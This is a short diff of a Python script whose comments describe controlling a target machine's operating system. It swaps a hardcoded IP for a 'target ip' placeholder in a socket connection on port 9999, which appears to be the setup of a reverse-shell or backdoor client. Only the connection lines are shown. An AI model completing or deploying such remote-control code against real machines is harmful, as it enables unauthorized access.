@@ -9,7 +9,7 @@ import socket #connect to serever
 import subprocess #allows to control of the Operating System onof target machine
 
 s = socket.socket()#compiter can connect to other computers
-host = '172.18.0.1'
+host = '###.#.#.#'#target ip
 port = 9999
 s.connect((host,port))#bind the network
 
